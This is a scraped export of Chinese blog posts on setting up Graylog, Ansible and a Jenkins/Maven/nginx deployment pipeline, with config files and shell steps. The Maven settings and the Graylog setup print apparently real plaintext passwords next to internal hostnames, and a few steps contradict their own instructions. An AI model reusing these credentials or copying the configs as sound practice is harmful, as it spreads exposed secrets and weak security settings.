test -f /sys/kernel/mm/transparent_hugepage/defrag; then echo never &gt; /sys/kernel/mm/transparent_hugepage/defrag fi---[root@graylog ~]# /etc/init.d/mongod restart 安装ElasticsearchGraylog目前为止只能使用Elasticsearch 2.0以前的版本，所以，在这一步中，我将安装Elasticsearch 1.7.x。 添加Elasticsearch GPG密钥： $ sudo rpm --import http://packages.elastic.co/GPG-KEY-elasticsearch 创建Elasticsearch源： $ sudo vim /etc/yum.repos.d/elasticsearch.repo 写入如下内容： 123456[elasticsearch-1.7]name=Elasticsearch repository for 1.7.x packagesbaseurl=http://packages.elastic.co/elasticsearch/1.7/centosgpgcheck=1gpgkey=http://packages.elastic.co/GPG-KEY-elasticsearchenabled=1 安装Elasticsearch： $ sudo yum -y install elasticsearch 配置前先创建几个目录文件 mkdir /data/es-data -p mkdir /data/es-work -p Elasticsearch安装完成之后，编辑配置文件： sudo vim /etc/elasticsearch/elasticsearch.yml node.data: true # 数据存放true 找到cluster.name一行，取消这一行的注释，并把值改为graylog-development： cluster.name: graylog-development path.data: /data/es-data es数据存放目录 这里需要自己新建目录 path.work: /data/es-work 你也许想要限制外部访问Elasticsearch（端口9200），这样可以提高系统的安全性。找到network.host一行，取消注释，并把值改为localhost： network.host: 192.168.1.234 保存退出文件。 重启Elasticsearch： $ service elasticsearch start 设置开机启动： $ chkconfig --add elasticsearch 执行如下命令测试Elasticsearch是否正常运行： $ curl -XGET &apos;http://localhost:9200/_cluster/health?pretty=true&apos; 输出的信息如下表示Elasticsearch安装成功： 1234567891011121314151617drwxr-xr-x. 2 root root 4096 9月 23 2011 src[root@ELK local]# curl -XGET 'http://192.168.1.234:9200/_cluster/health?pretty=true'&#123; \"cluster_name\" : \"graylog-development\", \"status\" : \"yellow\", \"timed_out\" : false, \"number_of_nodes\" : 1, \"number_of_data_nodes\" : 1, \"active_primary_shards\" : 37, \"active_shards\" : 37, \"relocating_shards\" : 0, \"initializing_shards\" : 0, \"unassigned_shards\" : 37, \"delayed_unassigned_shards\" : 0, \"number_of_pending_tasks\" : 0, \"number_of_in_flight_fetch\" : 0&#125; 安装Graylag Graylog的最新版是1.1.4，下载链接如下：https://packages.graylog2.org/repo/el/6Server/1.1/x86_64/graylog-server-1.1.4-1.noarch.rpmhttps://packages.graylog2.org/repo/el/6Server/1.1/x86_64/graylog-web-1.1.4-1.noarch.rpm 现在Graylog的所有依赖软件安装完成，这一步我们来安装graylog-server。 首先，下载Graylog RPM软件包： $ cd $ sudo rpm -Uvh https://packages.graylog2.org/repo/packages/graylog-1.3-repository-el7_latest.rpm 安装graylog-server： yum -y install graylog-server 安装pwgen，我们使用它生成随机密码： yum -y install epel-release yum -y install pwgen 现在我们来设置Graylog管理员的密钥。配置文件位于/etc/graylog/server/server.conf目录，需要修改password_secret参数： $ SECRET=$(pwgen -s 96 1) $ sudo -E sed -i -e &apos;s/password_secret =.*/password_secret = &apos;$SECRET&apos;/&apos; /etc/graylog/server/server.conf 执行完上面命令之后，password_secret参数的样子： 这一步，设置管理员密码。由于密码使用sha哈希算法，我们需要把明文密码转换为hash，然后赋值给root_password_sha2参数。例如，我要设置的管理员密码是 Ihaozhuo_b313，它对应的hash为： $ echo -n Ihaozhuo_b313 | sha256sum | awk &apos;{print $1}&apos; 编辑/etc/graylog/server/server.conf，设置root_password_sha2参数： $ sudo vim /etc/graylog/server/server.conf 现在Graylog管理员密码为Ihaozhuo_b313。 配置rest_transport_uri参数，设置Graylog web接口和服务器的沟通方式。由于我们把所有组件都安装到了单独的一个服务器上，需要把值设置为127.0.0.1 或 localhost。找到rest_transport_uri一行，取消注释，并把值设置为： rest_transport_uri = http://192.168.1.234:12900/ 由于我们只有一个Elasticsearch shard，需要把elasticsearch_shards参数设置为1： elasticsearch_shards = 1 更改elasticsearch_cluster_name参数，应该和前面Elasticsearch的cluster.name参数相对应： elasticsearch_cluster_name = graylog-development 取消下面两行的注释，检测Elasticsearch： 172 elasticsearch_discovery_zen_ping_multicast_enabled = false 173 elasticsearch_discovery_zen_ping_unicast_hosts = 192.168.1.234:9300 启动graylog-server： /etc/init.d/graylog-web restart 安装Graylog Web安装Graylog Web： $ sudo yum -y install graylog-web 安装完成之后配置Graylog Web的密钥，配置文件位于/etc/graylog/web/web.conf，更改application.secret参数： $ SECRET=$(pwgen -s 96 1) $ sudo -E sed -i -e &apos;s/application\\.secret=&quot;&quot;/application\\.secret=&quot;&apos;$SECRET&apos;&quot;/&apos; /etc/graylog/web/web.conf 配置graylog2-server.uris参数，它的值应该和Graylog的rest_listen_uri参数相对应： $ sudo vim /etc/graylog/web/web.conf graylog2-server.uris=&quot;http://127.0.0.1:12900/&quot; 重启graylog-web： /etc/init.d/graylog-web restart 配置Graylog服务器接收其他服务器的syslog日志登录Graylog Web使用浏览器访问Graylog服务器的域名或IP：http://graylog_public_IP_domain:9000/。 你应该能看到一个登录界面，使用admin做为用户名和前面设置的密码登录。 登录之后： 上面的红数字1是通知（you have a node without any running inputs），下面设置通过UDP接收syslog。 创建syslog UDP输入 添加要接收的其他服务器syslog日志：System-&gt;Inputs-&gt;Syslog UDP-&gt;Launch new input。 在弹出的窗口上输入如下信息： Title: syslog Port: 8514 Bind address: 这里写Graylog-server服务器主机IP 点击Launch 如果你需要收集多个服务器的日志，重复上面步骤。 现在，我们的Graylog服务器已经做好了接收其他服务器发来日志的准备。下面我们还需要配置其他服务器，让这些服务器给Graylog服务器发送日志。 配置其他服务器给Graylog服务器发送syslog参考官网：从Linux系统日志发送到Graylog SSH登录“其他服务器”，创建rsyslog配置文件90-graylog.conf： sudo vim /etc/rsyslog.d/90-graylog.conf 添加如下代码，把 graylog_server_IP 替换为Graylog服务器ip地址： $template GRAYLOGRFC5424,&quot;&lt;%pri%&gt;%protocol-version% %timestamp:::date-rfc3339% %HOSTNAME% %app-name% %procid% %msg%\\n&quot; *.* @graylog_server_IP:8514;GRAYLOGRFC5424 重启rsyslog服务使生效： /etc/init.d/rsyslog restart 配置完成之后，回到Graylog Web，点击Sources，查看是否有新添加rsyslog。 Graylog使用http协议发送：添加要接收的其他服务器syslog日志：System-&gt;Inputs-&gt;GELF HTTP-&gt;Launch new input。 然后在服务器上面发送下面命令。 12[root@graylog-development ~]# curl -XPOST http://192.168.1.234:12201/gelf -p0 -d '&#123;\"short_message\":\"Hello there\", \"host\":\"example.org\", \"facility\":\"test\", \"_foo\":\"bar\"&#125;'[root@graylog-development ~]# curl -XPOST http://192.168.1.234:12201/gelf -p0 -d '&#123;\"short_message\":\"测试\", \"host\":\"example.org\", \"facility\":\"test\", \"_foo\":\"bar\"&#125;' 这里定义192.168.1.234 是graylog-server服务器地址 12201 端口是之前创建好的。 搜素Graylog假如你要搜索hello： 上面安装配置了基本的Graylog服务器。 时区和高亮设置admin帐号的时区： 12345[root@graylog ~]# vi /etc/graylog/server/server.conf---30 root_timezone = Asia/Shanghai---[root@graylog ~]# /etc/init.d/graylog-server restart 其他帐号的默认时区： 12345[root@graylog ~]# vi /etc/graylog/web/web.conf---18 timezone=\"Asia/Shanghai\"---[root@graylog ~]# /etc/init.d/graylog-web restart 允许查询结果高亮： 12345[root@graylog ~]# vi /etc/graylog/server/server.conf---147 allow_highlighting = true---[root@graylog ~]# /etc/init.d/graylog-server restart 移动数据目录123456789101112131415161718移动elasticsearch的数据目录[root@graylog ~]# sudo /etc/init.d/elasticsearch stop[root@graylog ~]# sudo cp -rp /var/lib/elasticsearch/ /data/[root@graylog ~]# sudo vi /etc/sysconfig/elasticsearch+16 DATA_DIR=/data/elasticsearch[root@graylog ~]# sudo /etc/init.d/elasticsearch start移动mongo的数据目录[root@graylog ~]# sudo /etc/init.d/mongod stop[root@graylog ~]# sudo cp -rp /var/lib/mongo /data/[root@graylog ~]# sudo vi /etc/mongod.conf---13 dbpath=/var/lib/mongo-&gt;13 dbpath=/data/mongo---[mtagent@access2 ~]$ sudo /etc/init.d/mongod start 其余参考文档参考官网 Centos7 搭建graylog Graylog——日志聚合工具中的后起之秀","link":"/2016/11/13/日志分析\u0010平台/Graylog/Graylog—日志分析平台完美代替Elasticsearch/"},{"title":"Ansible 学习入门","text":"Ansible介绍 学习ansible这里我自己做了简单的介绍总结： Ansible是一个自动化工具。它可以配置系统,部署软件,编排更高级的任务,比如连续部署或零停机时间滚动更新。 Ansible的目标是最简单和最易用。它也有一个强烈关注安全性和可靠性,以最少的移动部件,使用OpenSSH运输(加速插座模式和拉模式选择),和设计语言,人类可审核性的——甚至是那些不熟悉程序。 我们认为简单是所有大小的环境和相关的设计对于忙碌的所有类型的用户——这是否意味着开发人员、系统管理员,发布工程师,经理,无处不在。Ansible适合管理小设置少量的实例以及与许多成千上万的企业环境。 Ansible管理机器以最好的方式。没有一个问题如何升级远程守护进程或无法管理系统的问题因为守护进程是卸载。OpenSSH是最同行评议的开源组件,使用该工具的安全风险大大降低。Ansible是分散的,它依赖于现有的操作系统凭证来控制访问远程机器,如果需要使用Kerberos,它可以很容易地连接LDAP和其他管理系统的集中式身份验证。 Ansible是一个彻底的简单自动化引擎,自动化云配置,配置管理、应用程序部署,intra-service编排,以及许多其他的需求。 被设计为多层部署自第一天,Ansible模型你的IT基础设施,描述如何推动你所有的系统,而不仅仅是管理一个系统。 它使用没有代理,没有额外的自定义安全基础设施,所以很容易部署,最重要的是,它使用一个非常简单的语言(YAML Ansible Playbooks的形式),让你描述你的自动化工作的方式方法简明英语。 我们利用Ansible主要是作为内网服务器的一些管理，因为他用ssh来管理配置，内网同学还是很快速的，外网主要是利用Saltstack，利用消息队列远程通信，我感觉是比Ansible好的。 为什么选择ansible Ansible大家都知道，和salt/puppet等一样，是一款配置管理工具。为什么选择它，就是因为它简单，不需要安装agent，只要服务器能用ssh访问，就可以使用它去管理大家如果要问，和我用rsync直接同步或写个for循环执行rpm或yum有什么区别. 我想最大的区别应该就是“并发”当然，大企业会自己去开发自己的持续部署平台，而大部分的还是中小型企业 其实部署每个环节都可以用rpm安装发布。 我们的某个应用直接构建成rpm，是直接放到我们另一个内部服务器中，提供http接口，然后执行的就是yum模块进行安装。 也有人问我salt有没有用过。其实我们最初是使用salt的，后来因为网络的原因，选择了没有agent的ansible。在阿里云上面还是salt去服务管理。 参考官网入门学习视频","link":"/2016/03/07/自动化+Jenkins/Ansible/ Ansible 学习入门 /"},{"title":"讲如何结合jenkins+ ansible构建发布系统","text":"jenkins+ansible，打造一个web构建发布系统自动化这块我们测试生产环境已经用起来了。 这篇文章主要讲我们如何实现整个web发布系统，如何安装配置看我blog上面有。 需要了解几款自动化工具： SaltStack,Ansible,Puppet,jenkins 所以我们第1步做的就是：用Ansible + Jenkins搞定自动发布。Ansible是相对简单的批量管理工具，支持模板管理等高级功能。搞定了自动发布，开发的服务器需求已经明显下降，只要把代码提交到 Git主干，就会自动触发发布。 Git使用的是 GitLab，后期同时为了安全我们做了一层LDAP代理，效果相当于“将军令”，操作机、Git和Jenkins用 OpenLDAP 做统一认证，后续用到的Redmine、Grafana、Zabbix等都接入了OpenLDAP认证，每个人都有个动态口令，每次验证都需要用到。 流程结构 简单绘制了下Jenkins的一个流程，如下图： 拓扑图 1234567891011121314151617181920212223 &gt; 该平台以jenkins 为中心，然后围绕他进行扩展。 &gt; 代码全局配置通过”文件管理平台” 进行管理。每次代码进行build时，pull一下配置。使配置为最新的。 &gt; 开发人员将代码push到gitlab，开发者之间相互review代码。然后murge到master分支。jenkins上的pull代码到workspace空间。 &gt; 安装一些依赖的第三方包。 &gt; 代码和配置文件进行合并，通过redis存储的版本信息创建版本。 &gt; 把将要发布的版本推送到远端机器，reload服务实现上线。 &gt; 当发布的代码出现问题，回滚指定版本(默认回滚上一版本)，最多可回滚之前5个版本。``` ansible是新出现的自动化运维工具，基于Python开发，集合了众多运维工具（puppet、cfengine、chef、func、fabric）的优点，实现了批量系统配置、批量程序部署、批量运行命令等功能。ansible是基于模块工作的，本身没有批量部署的能力。真正具有批量部署的是ansible所运行的模块，ansible只是提供一种框架。主要包括：```bash(1)、连接插件connection plugins：负责和被监控端实现通信；(2)、host inventory：指定操作的主机，是一个配置文件里面定义监控的主机；(3)、各种模块核心模块、command模块、自定义模块；(4)、借助于插件完成记录日志邮件等功能；(5)、playbook：剧本执行多个任务时，非必需可以让节点一次性运行多个任务。 这里之前用Jenkins使用起来。遇到个难题这里分析哪几点： 1234567github作为源代码仓库 jenkins做为打包服务器，Web控制服务器在jenkins的系统配置里，可以找到maven，git，Java相关的配置，只要勾选了，在开时执行job时，会自动下载。ansible把war包，发布到远程机器tomcat每台服务器环境都需要在ansible /etc/ansible/hosts配置好，这样可以让它自动化下发到对应机器。把jenkins生成的war包发布到远程服务器上。进入该项目的workspace目录下保存该playbook的仓库子目录下, 检查ansible版本, 并执行最终的部署命令.会不会发布出现乱码。 监控： 由于原始的监控不满足快速增长的业务，我这边部署了开源监控系统 Zabbix，虽然运维能够很好的使用Zabbix，但其他部门同事总觉得易用性不高、而且很多定制化监控实现起来很麻烦。还是需要有运维开发同事帮忙辅助会更好。","link":"/2016/10/29/自动化+Jenkins/Jenkins/讲如何结合jenkins+ ansible构建发布系统/"},{"title":"Ansible + Jenkins+Maven＋Nginx搞定自动发布，构建程序的持续集成平台","text":"Ansible+Jenkins搞定自动发布，构建程序的持续集成平台Ansible是相对简单的批量管理工具，支持模板管理等高级功能。搞定了自动发布，开发的服务器需求已经明显下降，只要把代码提交到 Git主干，就会自动触发发布。 今天有空就简单记录下用Ansible + Jenkins搞定自动发布 。这篇是主要环境安装。 一、什么是持续集成1、什么是集成 指的是代码由编译、发布和测试、直到上线的一个过程 2、什么持续集成 高效的、持续性质的不断迭代代码的集成工作 3、如何高效准确的实现持续集成 必不可少的需要一套能自动化、并且可视化的平台来帮助我们。 那么总结来看，Jenkins就是一个可以帮助我们实现持续集成的平台。 二、为什么Jenkins能帮助我们进行持续集成 理由有如下几点： 1、Jenkins是一个开源的、且基于JAVA代码开发的持续集成系统。 因为含有非常丰富的插件支持所以我们可以方便的打通版本库、测试构建环境、线上环境的所有环节。并且丰富友好的通知使用者和开发、管理人员。 2、安装维护简单 安装Jenkins，不太复杂。且支持通用的平台。 3、Java 应用 常用 在企业的软件构建过程中，JAVA的应用工程稍显复杂，由于复杂构建、和代码上线、并且服务的重启。整个过程下来，消耗的时间较多，Jenkins却能很好的集成maven的编译方式，且利用自动化的插件、和自定义开发脚本的支持。所以目前广泛的应用于JAVA工程的持续集成平台。 好了，那么接下来我就来介绍，如何搭建一套快速有效的Jenkins自动化发布持续集成平台。 前言为了提高工作效率，避免重复的手动发包部署工作，特搭建Jenkins+Ansible的自动部署平台。主要实现原理是： 由Jenkins拉取git代码 使用Maven命令编译打包 通过Ansible 发送war包到对应的服务器 通过Ansible执行远程服务器的重启命令 发布完成。 一. 环境介绍本平台搭建在CentOS6环境中，其他linux环境情况类似。在自动部署服务器中需要安装以下软件： JDK Git Maven Tomcat Jenkins Ansible 二. 步骤： ansible安装与配置； Jenkins的安装； Jenkins的配置； 安装配置tomcat 安装配置Java； 安装配置maven； nginx反向代理配置访问域名； 相关插件安装； 系统设置明细； slave节点配置； 一些依赖项的安装。 1.1 Ansible简单介绍Ansible是一个部署一群远程主机的工具。远程的主机可以是本地或者远程的虚拟 机，也可以是远程的物理机。Ansible通过SSH协议进行管理节点和远程节点之间的通信。理论上说管理员通过 ssh到一台远程主机上能做的操作Ansible都可以做。包括：拷贝文件、安装包、启动服务… 总结：Ansible把一些shell命令封装成一个个模块，并通过SSH连接，在远程机器上执行这些模块包含的脚本。 1.2 Ansible安装与配置系统环境：centos7.1直接使用yum安装ansible 12# yum install http://mirrors.sohu.com/fedora-epel/6/x86_64/epel-release-6-8.noarch.rpm# yum install ansible 安装完成之后，需要ansible中的hosts文件分组，编辑/etc/ansible/hosts文件，将目标机器加入分组，并配置好面秘钥登录。Ansible更多详细内容可以参考我之前写的ansibles学习篇 二. 安装Jenkins环境1) 安装并配置好JAVA、JDK、Tomcat，并去官网下载最新版本的war包。 去官网下载包资源： 1234apache-tomcat-8.0.28.tar.gzjenkins.warjdk1.8.0_66.tar.gzmaven.tar.gz 没有下载成功的我这里已下载好了。最新版本jenkins.wartomcat.tar.gzmaven.tar.gz 2.1 jdk安装：12345678910111213tar -zxvf jdk1.8.0_66.tar.gz -C /srv/. 这里在配置环境变量。vim /etc/profile.d/java.shexport JAVA_HOME=/srv/jdk1.8.0_66export CLASS_PATH=\"$JAVA_HOME/lib:$JAVA_HOME/jre/lib\"export PATH=$PATH:$JAVA_HOME/bin[root@Jenkins ~]# java -versionjava version \"1.8.0_66\"Java(TM) SE Runtime Environment (build 1.8.0_66-b17)Java HotSpot(TM) 64-Bit Server VM (build 25.66-b17, mixed mode) 2.2 Tomcat安装配置：Jenkins官网：https://jenkins.io/index.html可参考我之前写的文档：搭建配置tomcat环境 1234tar -zxvf apache-tomcat-8.0.28.tar.gz -C /srv/.mv apache-tomcat-8.0.28 tomcatuseradd -s /sbin/nologin tomcat chown -R tomcat:tomcat tomcat 2) 放在配置好Tomcat，启动Jenkins，根据提示，输入安装秘钥。 2.3 jenkins安装配置：12345mv jenkins.war /srv/tomcat/webapps/. cd /tomcat./bin/startup.sh然后打开地址：http://192.168.1.183:8080/jenkins新版本会提示下载安装插件。下载以后会让你设置账号和密码还有邮箱。 进入安装界面:第一次，登录，需要进行一个解锁 ，页面也会有提示. 秘钥的具体位置在：/root/.jenkins/secrets/initialAdminPassword中，我们可以通过这个文件中查看密码，并输入。 3) 设置好登录账号密码，根据推荐选项安装插件，等待下载安装完成。在插件安装过程中可能有些安装不成功，暂时先不用管。 它会给我们安装一些基础的插件早期jenkins默认是不需要登陆的。 1.3 Maven 安装和配置官网：http://maven.apache.org/官网下载：http://maven.apache.org/download.cgi历史版本下载：https://archive.apache.org/dist/maven/binaries/此时（20160208） Maven 最新版本为：3.3.9 Maven 3.3 的 JDK 最低要求是 JDK 1.7 - 我个人习惯 /opt 目录下创建一个目录 setups 用来存放各种软件安装包；在 /srv 目录下创建一个 program 用来存放各种解压后的软件包，下面的讲解也都是基于此习惯. 下载压缩包：wget http://mirrors.cnnic.cn/apache/maven/maven-3/3.3.9/binaries/apache-maven-3.3.9-bin.tar.gz解压指定到我个人习惯的安装目录下：tar zxvf apache-maven-3.3.9-bin.tar.gz -C /srv/program/.移到我个人习惯的安装目录下：mv maven3.3.9/ /srv/program/maven3 12345678环境变量设置：vim /etc/profile.d/maven.sh # Maven MAVEN_HOME=/srv/program/maven3 PATH=$PATH:$MAVEN_HOME/bin MAVEN_OPTS=\"-Xms256m -Xmx356m\" export MAVEN_HOME export PATH export MAVEN_OPTS 刷新配置文件：source /etc/profile测试是否安装成功：mvn -version 1.3.1 Maven 配置 配置项目连接上私服 全局方式配置： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;settings xmlns=\"http://maven.apache.org/SETTINGS/1.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/SETTINGS/1.0.0 http://maven.apache.org/xsd/settings-1.0.0.xsd\"&gt; &lt;!--本地仓库位置--&gt; &lt;localRepository&gt;/srv/mv2&lt;/localRepository&gt; &lt;pluginGroups&gt; &lt;/pluginGroups&gt; &lt;proxies&gt; &lt;/proxies&gt; &lt;!--设置 Nexus 认证信息--&gt; &lt;servers&gt; &lt;server&gt; &lt;id&gt;nexus-releases&lt;/id&gt; &lt;username&gt;admin&lt;/username&gt; &lt;password&gt;admin123&lt;/password&gt; &lt;/server&gt; &lt;server&gt; &lt;id&gt;nexus-snapshots&lt;/id&gt; &lt;username&gt;admin&lt;/username&gt; &lt;password&gt;admin123&lt;/password&gt; &lt;/server&gt; &lt;/servers&gt; &lt;!--设置 Nexus 镜像，后面只要本地没对应的以来，则到 Nexus 去找--&gt; &lt;mirrors&gt; &lt;mirror&gt; &lt;id&gt;nexus-releases&lt;/id&gt; &lt;mirrorOf&gt;*&lt;/mirrorOf&gt; &lt;url&gt;http://localhost:8081/nexus/content/groups/public&lt;/url&gt; &lt;/mirror&gt; &lt;mirror&gt; &lt;id&gt;nexus-snapshots&lt;/id&gt; &lt;mirrorOf&gt;*&lt;/mirrorOf&gt; &lt;url&gt;http://localhost:8081/nexus/content/groups/public-snapshots&lt;/url&gt; &lt;/mirror&gt; &lt;/mirrors&gt; &lt;profiles&gt; &lt;profile&gt; &lt;id&gt;nexus&lt;/id&gt; &lt;repositories&gt; &lt;repository&gt; &lt;id&gt;nexus-releases&lt;/id&gt; &lt;url&gt;http://nexus-releases&lt;/url&gt; &lt;releases&gt; &lt;enabled&gt;true&lt;/enabled&gt; &lt;/releases&gt; &lt;snapshots&gt; &lt;enabled&gt;true&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/repository&gt; &lt;repository&gt; &lt;id&gt;nexus-snapshots&lt;/id&gt; &lt;url&gt;http://nexus-snapshots&lt;/url&gt; &lt;releases&gt; &lt;enabled&gt;true&lt;/enabled&gt; &lt;/releases&gt; &lt;snapshots&gt; &lt;enabled&gt;true&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/repository&gt; &lt;/repositories&gt; &lt;pluginRepositories&gt; &lt;pluginRepository&gt; &lt;id&gt;nexus-releases&lt;/id&gt; &lt;url&gt;http://nexus-releases&lt;/url&gt; &lt;releases&gt; &lt;enabled&gt;true&lt;/enabled&gt; &lt;/releases&gt; &lt;snapshots&gt; &lt;enabled&gt;true&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/pluginRepository&gt; &lt;pluginRepository&gt; &lt;id&gt;nexus-snapshots&lt;/id&gt; &lt;url&gt;http://nexus-snapshots&lt;/url&gt; &lt;releases&gt; &lt;enabled&gt;true&lt;/enabled&gt; &lt;/releases&gt; &lt;snapshots&gt; &lt;enabled&gt;true&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/pluginRepository&gt; &lt;/pluginRepositories&gt; &lt;/profile&gt; &lt;/profiles&gt; &lt;activeProfiles&gt; &lt;activeProfile&gt;nexus&lt;/activeProfile&gt; &lt;/activeProfiles&gt;&lt;/settings&gt; jenkins发布修改过以后： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596&lt;settings xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/settings-1.0.0.xsd\"&gt; &lt;!--表示本地库的保存位置，也就是maven2主要的jar保存位置，默认在$&#123;user.dir&#125;/.m2/repository，如果需要另外设置，就换成其他的路径。 --&gt; &lt;localRepository&gt;/srv/m2&lt;/localRepository&gt; &lt;interactiveMode/&gt; &lt;usePluginRegistry/&gt; &lt;offline&gt;false&lt;/offline&gt; &lt;!--当插件的组织Id（groupId）没有显式提供时，供搜寻插件组织Id（groupId）的列表。该元素包含一个pluginGroup元素列表，每个子元素包含了一个组织Id（groupId）。当我们使用某个插件，并且没有在命令行为其提供组织Id（groupId）的时候，Maven就会使用该列表。默认情况下该列表包含了org.apache.maven.plugins。 --&gt; &lt;pluginGroups&gt; &lt;!--plugin的组织Id（groupId） --&gt; &lt;pluginGroup&gt;org.codehaus.mojo&lt;/pluginGroup&gt;&lt;pluginGroup&gt;org.apache.tomcat.maven&lt;/pluginGroup&gt;&lt;pluginGroup&gt;org.mortbay.jetty&lt;/pluginGroup&gt; &lt;/pluginGroups&gt; &lt;servers&gt; &lt;server&gt; &lt;id&gt;tomcat&lt;/id&gt; &lt;username&gt;tomcat&lt;/username&gt; &lt;password&gt;keyfree123&lt;/password&gt; &lt;/server&gt; &lt;server&gt; &lt;id&gt;haozhuo&lt;/id&gt; &lt;username&gt;haozhuo&lt;/username&gt; &lt;password&gt;haozhuo123&lt;/password&gt; &lt;/server&gt; &lt;!--d:server 的id,用于匹配distributionManagement库id，比较重要。 --&gt; &lt;server&gt; &lt;id&gt;nexus-releases&lt;/id&gt; &lt;!--username, password:用于登陆此服务器的用户名和密码 --&gt; &lt;username&gt;admin&lt;/username&gt; &lt;password&gt;123456&lt;/password&gt; &lt;/server&gt; &lt;server&gt; &lt;id&gt;nexus-snapshots&lt;/id&gt; &lt;username&gt;admin&lt;/username&gt; &lt;password&gt;123456&lt;/password&gt; &lt;/server&gt; &lt;/servers&gt; &lt;mirrors&gt; &lt;!--表示镜像库，指定库的镜像，用于增加其他库 --&gt; &lt;mirror&gt; &lt;id&gt;nexus-aliyun&lt;/id&gt; &lt;mirrorOf&gt;*&lt;/mirrorOf&gt; &lt;name&gt;Nexus aliyun&lt;/name&gt; &lt;url&gt;http://maven.aliyun.com/nexus/content/groups/public&lt;/url&gt; &lt;/mirror&gt; &lt;mirror&gt; &lt;id&gt;hz&lt;/id&gt; &lt;name&gt;hz Central&lt;/name&gt; &lt;url&gt;http://nexus.haozhuo.com:8083/nexus/content/groups/public/&lt;/url&gt; &lt;mirrorOf&gt;central&lt;/mirrorOf&gt; &lt;/mirror&gt; &lt;mirror&gt; &lt;id&gt;CN&lt;/id&gt; &lt;name&gt;OSChina Central&lt;/name&gt; &lt;url&gt;http://maven.oschina.net/content/groups/public/&lt;/url&gt; &lt;mirrorOf&gt;central&lt;/mirrorOf&gt; &lt;/mirror&gt; &lt;mirror&gt; &lt;id&gt;ibiblio.org&lt;/id&gt; &lt;name&gt;ibiblio Mirror of http://repo1.maven.org/maven2/&lt;/name&gt; &lt;url&gt;http://mirrors.ibiblio.org/pub/mirrors/maven2&lt;/url&gt; &lt;mirrorOf&gt;central&lt;/mirrorOf&gt; &lt;/mirror&gt; &lt;!-- &lt;mirror&gt; &lt;id&gt;jboss-public-repository-group&lt;/id&gt; &lt;mirrorOf&gt;central&lt;/mirrorOf&gt; &lt;name&gt;JBoss Public Repository Group&lt;/name&gt; &lt;url&gt;http://repository.jboss.org/nexus/content/groups/public&lt;/url&gt; &lt;/mirror&gt; --&gt; &lt;/mirrors&gt; &lt;activeProfiles&gt; &lt;!--make the profile active all the time --&gt; &lt;!--&lt;activeProfile&gt;nexus&lt;/activeProfile&gt; --&gt; &lt;/activeProfiles&gt;&lt;/settings&gt; 三. 配置nginx反向代理.在nginx配置目录/usr/local/nginx/conf/nginx.conf，配置文件内容如下 1234567891011121314151617upstream tomcat-jenkins &#123; server 192.168.1.220:8080 weight=1; &#125; server &#123; listen 80; server_name jenkins.yjk.cn; location / &#123; index index.html index.php index.jsp index.htm; proxy_pass http://tomcat-jenkins; proxy_ignore_client_abort on; proxy_redirect off; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; &#125; &#125; 修改/etc/hosts，在末尾新增一行 : 1127.0.0.1 jenkins.yjk.cn 重启nginx，/usr/sbin/nginx -s reload，即可以地址 jenkins.yjk.cn 访问Jenkins主页. 四. 安装部分Jenkins插件访问Jenkins主页：http://jenkins.yjk.cn系统管理 –&gt; 管理插件 –&gt; 可选插件;安装所需要的插件(根据需要自行选择)，如 GitBucket Plugin、 FindBugs Plug-in 、Cobertura Plugin 、 Violations Plugin 、Email Extension Plugin等 ⚠️插件安装不成功处理办法： 进入左侧菜单栏的系统管理，发现很多插件无法安装成功，如下图： 复制安装失败的名称，点击右侧按钮，选择可选插件，输入名称重新安装。 如果还是失败，请注意提示信息，可直接下载该插件手动上传安装，手动下载该插件，在插件管理的高级标签中，选择上传安装。 如果上传失败，还有个方法：直接把下载下来的插件上传到Jenkins服务器上面。默认安装的话目录在：/root/.jenkins/plugins/ 重启服务即可. 五. 系统设置以及介绍（可跳过）1.1 系统配置进入首页系统管理—&gt;系统设置。 配置maven 配置邮件服务 主目录默认在 /root/.jenkins 下面，此目录保存jenkins 的所有配置和插件等，具体可以于服务器中查看该目录。下面可以继续配置maven，jdk，git等等，也可以使用默认的配置。 1.2 项目配置新建一个自由风格的项目，输入项目名称。 1.参数配置 简单的从Git中拉取代码无法满足我们的需求，最理想的状态是可以对发布的分支进行动态选择。所以我们需要安装一个配置动态参数的插件：Dynamic Parameter Plug-in 安装好插件之后，在项目配置，参数化构建过程中添加动态参数： 输入变量名称和脚本，在接下来的配置中就可以使用$Name的方式，使用变量了。如：$branch。 12def gettags = (\"git ls-remote -h git@gitlab.ihaozhuo.com:Java_Service/YJK-Java.git\").execute() gettags.text.readLines().collect &#123; it.split()[1].replaceAll('refs/heads/', '') &#125;.unique() 这是一段Groovy脚本，用来获取Git地址的分支，将Git地址改成自己的就行。 1.3接下来选择扩展功能。由于我们的项目模块较多，所有的服务全部重启会非常浪费时间，我们希望能对单独的模块进行部署，这时候需要添加一个可选择的参数Extensible Choice Parameter 扩展选择参数插件Extensible Choice Parameter灵活使用实现部署多应用模块服务同时发布.单模块服务单独打包快速发布. 实现效果： 发布选择应用模块，之前只能单个选择发布，效率太低，安装choice扩展性的插件，可以选择多个模块应用一起部署。非常方便下载插件：Extended Choice Parameter Plug-InExtensible Choice Parameter plugin 这里jenkins 第一步安装扩展插件： 安装好插件以后 进入创建项目配置参数： Value ：这里选择模块名字最好是git拉取下来的名称一样。这样下面打包可以选择对应模块名称一样。 这里构建使用shell 做一层if 判断 选择all 全部发布。和单独模块发布。 1.4Git配置初次使用Jenkins需要添加一个有访问Git权限的用户。我直接使用系统自带的ssh-key，也可以自己去生成。在gitlab上添加ssh-key公钥 这个是你发布机器的公钥。 1.源码管理选择Git，输入URL，并选择用户。 从Jenkins发布服务器上面查看公钥上传到gitlab. 